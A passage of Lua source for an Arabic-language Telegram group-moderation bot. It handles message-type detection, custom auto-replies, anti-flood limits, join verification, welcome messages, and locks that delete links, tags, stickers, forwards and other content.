--     By Developer Faeder     -- 
if msg.content_.ID == "MessageSticker" then
print("This is [ Sticker ]")
msg_type = 'MSG:Sticker'
end
--     By Developer Faeder     -- 
if msg.content_.ID == "MessageAudio" then
print("This is [ Audio ]")
msg_type = 'MSG:Audio'
end
--     By Developer Faeder     -- 
if msg.content_.ID == "MessageVoice" then
print("This is [ Voice ]")
msg_type = 'MSG:Voice'
end
--     By Developer Faeder     -- 
if msg.content_.ID == "MessageVideo" then
print("This is [ Video ]")
msg_type = 'MSG:Video'
end
--     By Developer Faeder     -- 
if msg.content_.ID == "MessageAnimation" then
print("This is [ Gif ]")
msg_type = 'MSG:Gif'
end
--     By Developer Faeder     -- 
if msg.content_.ID == "MessageLocation" then
print("This is [ Location ]")
msg_type = 'MSG:Location'
end
--     By Developer Faeder     -- 
if msg.content_.ID == "MessageChatJoinByLink" then
print("This is [ Msg Join By link ]")
if faederdx1:get(FAEDER.."UnKedDeleteMessage"..msg.chat_id_) == "open" then
local Text = '↫ اهلا عزيزي .\n↫ يجب علينا التأكد أنك لست روبوت .\n↫ تم تقييدك اضغط الزر بالاسفل 🔽\n'
keyboard = {} -- الحقوق محفوظه لسورس لاكس لتخمط بدون ذكر المصدر
keyboard.inline_keyboard = {{{text = '- اضغط هنا لفك تقييدك •', callback_data="/UnKed"},},}
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..tokenbot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_)
faederdx1:sadd(FAEDER.."faederdx1:Un:Ked"..msg.chat_id_,msg.sender_user_id_)
https.request("https://api.telegram.org/bot"..tokenbot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
msg_type = 'MSG:NewUser'
end
--     By Developer Faeder     -- 
if msg.content_.ID == "MessageChatJoinByLink" then
print("This is [ Msg Join By link ]")
msg_type = 'MSG:NewUser'
end
--     By Developer Faeder     -- 
if not msg.reply_markup_ and msg.via_bot_user_id_ ~= 0 then
print("This is [ MarkDown ]")
msg_type = 'MSG:MarkDown'
end
--     By Developer Faeder     -- 
if msg.content_.ID == "MessageChatJoinByLink" then
print("This is [ Msg Join By Link ]")
msg_type = 'MSG:JoinByLink'
end
--     By Developer Faeder     -- 
if msg.content_.ID == "MessageContact" then
print("This is [ Contact ]")
msg_type = 'MSG:Contact'
end 
---------------
end
--     By Developer Faeder     -- 
if ((not d) and chat) then
if msg.content_.ID == "MessageText" then
do_notify (chat.title_, msg.content_.text_)
else
do_notify (chat.title_, msg.content_.ID)
end end
--     By Developer Faeder     -- 
if msg.content_.photo_ then
if faederdx1:get(FAEDER..'bot:setphoto'..msg.chat_id_..':'..msg.sender_user_id_) then
if msg.content_.photo_.sizes_[3] then
photo_id = msg.content_.photo_.sizes_[3].photo_.persistent_id_
else
photo_id = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم تغيير صوره المجموعه . \n', 1, 'md') 
faederdx1:del(FAEDER..'bot:setphoto'..msg.chat_id_..':'..msg.sender_user_id_)
setphoto(msg.chat_id_, photo_id)
end end
--     By Developer Faeder     -- 
text = msg.content_.text_ 
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then 
local content_text = faederdx1:get(FAEDER..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
if content_text == 'save_repgp' then 
if text == 'الغاء' then
local delrep_owner = faederdx1:get(FAEDER..'delrep_owner'..msg.chat_id_..'')
faederdx1:srem(FAEDER..'rep_owner'..msg.chat_id_..'',delrep_owner)
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم الغاء الامر . \n', 1, 'md')
faederdx1:del(FAEDER..'addreplaygp:'..msg.sender_user_id_..''..msg.chat_id_..'')
faederdx1:del(FAEDER..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_)
faederdx1:del(FAEDER..'delrep_owner'..msg.chat_id_..'')
return false
end
faederdx1:del(FAEDER..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
local content_text = faederdx1:get(FAEDER..'addreplaygp:'..msg.sender_user_id_..''..msg.chat_id_..'')
if msg.content_.video_ then faederdx1:set(FAEDER..'video_repgp'..content_text..''..msg.chat_id_..'', msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then faederdx1:set(FAEDER..'file_repgp'..content_text..''..msg.chat_id_..'', msg.content_.document_.document_.persistent_id_)
end
if msg.content_.sticker_ then faederdx1:set(FAEDER..'stecker_repgp'..content_text..''..msg.chat_id_..'', msg.content_.sticker_.sticker_.persistent_id_) 
end 
if msg.content_.voice_ then faederdx1:set(FAEDER..'voice_repgp'..content_text..''..msg.chat_id_..'', msg.content_.voice_.voice_.persistent_id_) 
end
if msg.content_.audio_ then faederdx1:set(FAEDER..'audio_repgp'..content_text..''..msg.chat_id_..'', msg.content_.audio_.audio_.persistent_id_) 
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_group = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_group = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_group = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_group = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
faederdx1:set(FAEDER..'photo_repgp'..content_text..''..msg.chat_id_..'', photo_in_group) 
end
if msg.content_.animation_ then faederdx1:set(FAEDER..'gif_repgp'..content_text..''..msg.chat_id_..'', msg.content_.animation_.animation_.persistent_id_) 
end 
if msg.content_.text_ then
faederdx1:set(FAEDER..'text_repgp'..content_text..''..msg.chat_id_..'', msg.content_.text_)
end 
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم حفظ الرد . \n', 1, 'md') 
faederdx1:del(FAEDER..'addreplaygp:'..msg.sender_user_id_..''..msg.chat_id_..'')
faederdx1:del(FAEDER..'delrep_owner'..msg.chat_id_..'')
return false 
end end
if msg.content_.text_ and not faederdx1:get(FAEDER..'lock_reeeep'..msg.chat_id_) then 
if faederdx1:get(FAEDER..'video_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, faederdx1:get(FAEDER..'video_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
end 
if faederdx1:get(FAEDER..'file_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, faederdx1:get(FAEDER..'file_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
end 
if faederdx1:get(FAEDER..'voice_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, faederdx1:get(FAEDER..'voice_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
end
if faederdx1:get(FAEDER..'audio_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, faederdx1:get(FAEDER..'audio_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
end
if faederdx1:get(FAEDER..'photo_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, faederdx1:get(FAEDER..'photo_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
end
if faederdx1:get(FAEDER..'gif_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, faederdx1:get(FAEDER..'gif_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
end 
if faederdx1:get(FAEDER..'stecker_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, faederdx1:get(FAEDER..'stecker_repgp'..msg.content_.text_..''..msg.chat_id_..''))
end 
if faederdx1:get(FAEDER..'text_repgp'..msg.content_.text_..''..msg.chat_id_..'') then
function faeder(extra,result,success)
if result.username_ then username = '[@'..result.username_..']' else username = 'لا يوجد' end
local faederdxs = (faederdx1:get('faeder:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
local user_msgs = faederdx1:get(FAEDER..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = faederdx1:get(FAEDER..'text_repgp'..msg.content_.text_..''..msg.chat_id_..'')
local Text = Text:gsub('#username',(username or 'لا يوجد')) 
local Text = Text:gsub('#name','['..result.first_name_..']')
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#msgs',(user_msgs + faederdxs or 'لا يوجد'))
local Text = Text:gsub('#stast',(renk_faeder(msg) or 'لا يوجد'))
faederdx(msg.chat_id_, msg.id_, 1, Text ,  1, "md")
end
getUser(msg.sender_user_id_, faeder)
end end
--     By Developer Faeder     -- 
text = msg.content_.text_
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then
local content_text = faederdx1:get(FAEDER.."add:repallt"..msg.sender_user_id_)
if content_text == 'save_rep' then
if text == 'الغاء' then
local delrep_sudo = faederdx1:get(FAEDER..'delrep_sudo')
faederdx1:del(FAEDER.."rep_sudo",delrep_sudo)
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم الغاء الامر . \n', 1, 'md')
faederdx1:del(FAEDER.."addreply2:"..msg.sender_user_id_)
faederdx1:del(FAEDER.."add:repallt"..msg.sender_user_id_)
faederdx1:del(FAEDER.."delrep_sudo")
return false
end
faederdx1:del(FAEDER.."add:repallt"..msg.sender_user_id_)
local content_text = faederdx1:get(FAEDER.."addreply2:"..msg.sender_user_id_)
if msg.content_.video_ then
faederdx1:set(FAEDER.."video_repall"..content_text, msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then
faederdx1:set(FAEDER.."file_repall"..content_text, msg.content_.document_.document_.persistent_id_)
end
if msg.content_.sticker_ then
faederdx1:set(FAEDER.."stecker_repall"..content_text, msg.content_.sticker_.sticker_.persistent_id_)
end
if msg.content_.voice_ then
faederdx1:set(FAEDER.."voice_repall"..content_text, msg.content_.voice_.voice_.persistent_id_)
end
if msg.content_.audio_ then
faederdx1:set(FAEDER.."audio_repall"..content_text, msg.content_.audio_.audio_.persistent_id_)
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_all_groups = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_all_groups = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_all_groups = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_all_groups = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
faederdx1:set(FAEDER.."photo_repall"..content_text, photo_in_all_groups)
end
if msg.content_.animation_ then
faederdx1:set(FAEDER.."gif_repall"..content_text, msg.content_.animation_.animation_.persistent_id_)
end
if msg.content_.text_ then
faederdx1:set(FAEDER.."text_repall"..content_text, msg.content_.text_)
end 
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم الغاء الامر . \n', 1, 'md') 
faederdx1:del(FAEDER.."addreply2:"..msg.sender_user_id_)
faederdx1:del(FAEDER..'delrep_sudo')
return false end end
if msg.content_.text_ and not faederdx1:get(FAEDER..'lock_reeeep'..msg.chat_id_) then
if faederdx1:get(FAEDER.."video_repall"..msg.content_.text_) then
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, faederdx1:get(FAEDER.."video_repall"..msg.content_.text_))
end
if faederdx1:get(FAEDER.."file_repall"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, faederdx1:get(FAEDER.."file_repall"..msg.content_.text_))
end
if faederdx1:get(FAEDER.."voice_repall"..msg.content_.text_)  then
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, faederdx1:get(FAEDER.."voice_repall"..msg.content_.text_))
end
if faederdx1:get(FAEDER.."audio_repall"..msg.content_.text_)  then
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, faederdx1:get(FAEDER.."audio_repall"..msg.content_.text_))
end
if faederdx1:get(FAEDER.."photo_repall"..msg.content_.text_)  then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, faederdx1:get(FAEDER.."photo_repall"..msg.content_.text_))
end
if  faederdx1:get(FAEDER.."gif_repall"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, faederdx1:get(FAEDER.."gif_repall"..msg.content_.text_))
end
if faederdx1:get(FAEDER.."stecker_repall"..msg.content_.text_) then
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, faederdx1:get(FAEDER.."stecker_repall"..msg.content_.text_))
end
if faederdx1:get(FAEDER.."text_repall"..msg.content_.text_) then
function faeder(extra,result,success)
if result.username_ then username = '[@'..result.username_..']' else username = 'لا يوجد' end
local faederdxs = (faederdx1:get('faeder:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
local user_msgs = faederdx1:get(FAEDER..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = faederdx1:get(FAEDER.."text_repall"..msg.content_.text_)
local Text = Text:gsub('#username',(username or 'لا يوجد')) 
local Text = Text:gsub('#name','['..result.first_name_..']')
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#msgs',(user_msgs + faederdxs or 'لا يوجد'))
local Text = Text:gsub('#stast',(renk_faeder(msg) or 'لا يوجد'))
faederdx(msg.chat_id_, msg.id_, 1, Text ,  1, "md")
end
getUser(msg.sender_user_id_, faeder)
end end 
--     By Developer Faeder     -- 
-------- Flood Max 
local flmax = 'flood:max:'..msg.chat_id_
if not faederdx1:get(FAEDER..flmax) then
floodMax = 5
else
floodMax = tonumber(faederdx1:get(FAEDER..flmax))
end
--     By Developer Faeder     -- 
-------- Msg
local pm = 'flood:'..msg.sender_user_id_..':'..msg.chat_id_..':msgs'
if not faederdx1:get(FAEDER..pm) then
msgs = 0
else
msgs = tonumber(faederdx1:get(FAEDER..pm))
end
--     By Developer Faeder     -- 
-------- Flood Check Time
local TIME_CHECK = 2
-------- Flood Check
local hashflood = 'anti-flood:'..msg.chat_id_
if msgs > (floodMax - 1) then
if faederdx1:get(FAEDER..'floodstatus'..msg.chat_id_) == 'Kicked' then
del_all_msgs(msg.chat_id_, msg.sender_user_id_)
chat_kick(msg.chat_id_, msg.sender_user_id_)
local faeder = '↫ العضو ('..msg.sender_user_id_..') \n↫ قام بالتكرار المحدد تم طرده  '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 12, string.len(msg.sender_user_id_))
elseif faederdx1:get(FAEDER..'floodstatus'..msg.chat_id_) == 'DelMsg' then
del_all_msgs(msg.chat_id_, msg.sender_user_id_)
else
del_all_msgs(msg.chat_id_, msg.sender_user_id_)
end end
--     By Developer Faeder     -- 
local check_username = function(extra, result, success)
local fname = result.first_name_ or ""
local lname = result.last_name_ or ""
local name = fname .. " " .. lname
local username = result.username_
local svuser = "user:Name" .. result.id_
local id = result.id_
if username then
faederdx1:set(FAEDER..svuser, "@" .. username)
else
faederdx1:set(FAEDER..svuser, name)
end end
getUser(msg.sender_user_id_, check_username)
--     By Developer Faeder     -- 
if is_banned(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
chat_kick(msg.chat_id_, msg.sender_user_id_)
return
end
--     By Developer Faeder     -- 
if is_muted(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
return
end
--     By Developer Faeder     -- 
if is_gbanned(msg.sender_user_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
chat_kick(msg.chat_id_, msg.sender_user_id_)
delete_msg(chat,msgs)
return
end
--     By Developer Faeder     -- 
if is_mutedall(msg.sender_user_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
return
end
--     By Developer Faeder     -- 
if faederdx1:get(FAEDER..'bot:muteall'..msg.chat_id_) and not is_momod(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
return
end
--     By Developer Faeder     -- 
faederdx1:incr(FAEDER..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_)
faederdx1:incr(FAEDER..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
faederdx1:incr(FAEDER..'group:msgs'..msg.chat_id_)
if msg.content_.ID == "MessagePinMessage" then
if faederdx1:get(FAEDER..'pinnedmsg'..msg.chat_id_) and faederdx1:get(FAEDER..'bot:pin:mute'..msg.chat_id_) then
unpinmsg(msg.chat_id_)
local pin_id = faederdx1:get(FAEDER..'pinnedmsg'..msg.chat_id_)
pinmsg(msg.chat_id_,pin_id,0)
end end
--     By Developer Faeder     -- 
if faederdx1:get(FAEDER..'bot:viewget'..msg.sender_user_id_) then
if not msg.forward_info_ then
if faederdx1:get(FAEDER..'lang:gp:'..msg.chat_id_) then
end
faederdx1:del(FAEDER..'bot:viewget'..msg.sender_user_id_)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ مشاهدات المنشور '..msg.views_..' مشاهده تقريبا .', 1, 'md')
faederdx1:del(FAEDER..'bot:viewget'..msg.sender_user_id_)
end end
--     By Developer Faeder     -- 
-------- Photo
if msg_type == 'MSG:Photo' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if faederdx1:get(FAEDER..'anti-flood:'..msg.chat_id_) then
faederdx1:setex(FAEDER..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if faederdx1:get(FAEDER..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Photo]")
end end end
if faederdx1:get(FAEDER..'bot:photo:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Photo]")
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if faederdx1:get(FAEDER..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Photo]")
if faederdx1:get(FAEDER..'bot:strict'..msg.chat_id_) then
chat_kick(msg.chat_id_, msg.sender_user_id_)
end end end
if faederdx1:get(FAEDER..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Photo]")
end end
if msg.content_.caption_:match("#") then
if faederdx1:get(FAEDER..'bot:hashtag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Hashtag] [Photo]")
end end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if faederdx1:get(FAEDER..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Hashtag] [Photo]")
end end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if faederdx1:get(FAEDER..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Photo]")
end end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if faederdx1:get(FAEDER..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Photo]")
end end end end
--     By Developer Faeder     -- 
-------- Markdown
elseif msg_type == 'MSG:MarkDown' then
if faederdx1:get(FAEDER..'markdown:lock'..msg.chat_id_) then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
end end
--     By Developer Faeder     -- 
-------- Document
elseif msg_type == 'MSG:Document' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if faederdx1:get(FAEDER..'anti-flood:'..msg.chat_id_) then
faederdx1:setex(FAEDER..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if faederdx1:get(FAEDER..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Document]")
end end end
if faederdx1:get(FAEDER..'bot:document:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Document]")
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if faederdx1:get(FAEDER..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Document]")
if faederdx1:get(FAEDER..'bot:strict'..msg.chat_id_) then
chat_kick(msg.chat_id_, msg.sender_user_id_)
end end end
if faederdx1:get(FAEDER..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Document]")
end end
if msg.content_.caption_:match("#") then
if faederdx1:get(FAEDER..'bot:hashtag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Hashtag] [Document]")
end end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if faederdx1:get(FAEDER..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Document]")
end end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if faederdx1:get(FAEDER..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Document]")
end end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if faederdx1:get(FAEDER..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Document]")
end end end end
--     By Developer Faeder     -- 
-------- Inline
elseif msg.reply_markup_ and msg.reply_markup_.ID == "ReplyMarkupInlineKeyboard" and msg.via_bot_user_id_ ~= 0 then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if faederdx1:get(FAEDER..'anti-flood:'..msg.chat_id_) then
faederdx1:setex(FAEDER..pm, TIME_CHECK, msgs+1)
end
if faederdx1:get(FAEDER..'bot:inline:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Inline]")
end end
--     By Developer Faeder     -- 
-------- Sticker
elseif msg_type == 'MSG:Sticker' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if faederdx1:get(FAEDER..'anti-flood:'..msg.chat_id_) then
faederdx1:setex(FAEDER..pm, TIME_CHECK, msgs+1)
end
if faederdx1:get(FAEDER..'bot:sticker:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Sticker]")
end end
elseif msg_type == 'MSG:JoinByLink' then
if faederdx1:get(FAEDER..'bot:tgservice:jk'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_ 
 delete_msg(chat,msgs)
print("Deleted [Lock] [Tgservice] [JoinByLink]")
return
end
function get_welcome(extra,result,success)
if faederdx1:get(FAEDER..'get:welcome'..msg.chat_id_) then
text = faederdx1:get(FAEDER..'get:welcome'..msg.chat_id_)
else
text = '↫ هلا بالقمر 👋 \n↫ name \n↫ @user \n↫ في '..title_name(msg.chat_id_)..' \n'
end
local text = text:gsub('name',(result.first_name_ or ''))
local text = text:gsub('lname',(result.last_name_ or ''))
local text = text:gsub('user',(result.username_ or 'Faeder_Ch'))
faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end 
if faederdx1:get(FAEDER.."bot:welcome"..msg.chat_id_) then
getUser(msg.sender_user_id_,get_welcome)
end
--     By Developer Faeder     -- 
-------- New User Add
elseif msg_type == 'MSG:NewUserAdd' then
if faederdx1:get(FAEDER..'bot:tgservice:jk'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tgservice] [NewUserAdd]")
return
end
if msg.content_.members_[0].username_ and msg.content_.members_[0].username_:match("[Bb][Oo][Tt]$") then
if not is_momod(msg.content_.members_[0].id_, msg.chat_id_) then
if faederdx1:get(FAEDER..'bot:bots:gkgk'..msg.chat_id_) then
chat_kick(msg.chat_id_, msg.content_.members_[0].id_)
return false
end end end
if is_banned(msg.content_.members_[0].id_, msg.chat_id_) then
chat_kick(msg.chat_id_, msg.content_.members_[0].id_)
return false
end
if faederdx1:get(FAEDER.."bot:welcome"..msg.chat_id_) then
if faederdx1:get(FAEDER..'get:welcome'..msg.chat_id_) then
text = faederdx1:get(FAEDER..'get:welcome'..msg.chat_id_)
else
text = '↫ هلا بالقمر 👋 \n↫ name \n↫ @user \n↫ في '..title_name(msg.chat_id_)..' \n'
end
local text = text:gsub('name',(msg.content_.members_[0].first_name_ or ''))
local text = text:gsub('lname',(msg.content_.members_[0].last_name_ or ''))
local text = text:gsub('user',(msg.content_.members_[0].username_ or 'Faeder_Ch'))
faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
--     By Developer Faeder     -- 
-------- Contact
elseif msg_type == 'MSG:Contact' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if faederdx1:get(FAEDER..'anti-flood:'..msg.chat_id_) then
faederdx1:setex(FAEDER..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if faederdx1:get(FAEDER..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Contact]")
end end end
if faederdx1:get(FAEDER..'bot:contact:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Contact]")
end end
--     By Developer Faeder     -- 
-------- Audio
elseif msg_type == 'MSG:Audio' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if faederdx1:get(FAEDER..'anti-flood:'..msg.chat_id_) then
faederdx1:setex(FAEDER..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if faederdx1:get(FAEDER..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
